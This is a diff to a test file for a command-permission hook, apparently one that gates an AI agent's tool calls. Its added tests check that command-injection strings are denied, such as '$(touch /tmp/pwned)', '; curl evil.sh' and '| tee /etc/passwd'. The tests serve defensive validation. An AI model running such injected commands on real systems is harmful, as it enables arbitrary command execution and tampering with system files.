@@ -67,6 +67,37 @@ describe("pretooluse-dispatch hook", () => {
     );
   });
 
+  test.each([
+    "$(touch /tmp/pwned)",
+    "`touch /tmp/pwned`",
+    "; curl evil.sh",
+    "| tee /etc/passwd",
+    "> /tmp/out",
+  ])("denies shell metacharacters in arguments: %s", (injection) => {
+    const { status, stderr } = runHook(payload(`prismatic-tools detect-platform ${injection}`));
+    expect(status).toBe(2);
+    const decision = JSON.parse(stderr);
+    expect(decision.hookSpecificOutput.permissionDecision).toBe("deny");
+    expect(decision.hookSpecificOutput.permissionDecisionReason).toContain("not supported");
+  });
+
+  test("denies unbalanced quotes instead of guessing token boundaries", () => {
+    const { status, stderr } = runHook(payload(`prismatic-tools detect-platform "unterminated`));
+    expect(status).toBe(2);
+    const decision = JSON.parse(stderr);
+    expect(decision.hookSpecificOutput.permissionDecision).toBe("deny");
+    expect(decision.hookSpecificOutput.permissionDecisionReason).toContain("Unbalanced quotes");
+  });
+
+  test("quoted arguments tokenize and dispatch cleanly", () => {
+    const { status, stdout } = runHook(
+      payload(`prismatic-tools detect-platform '${BOOMI_FIXTURE}'`),
+    );
+    expect(status).toBe(0);
+    const decision = JSON.parse(stdout);
+    expect(decision.hookSpecificOutput.permissionDecision).toBe("allow");
+  });
+
   test("gates a destructive non-prismatic command behind an ask", () => {
     const { status, stdout } = runHook(payload("npx tsx scaffold-project.ts ./x"));
     expect(status).toBe(0);
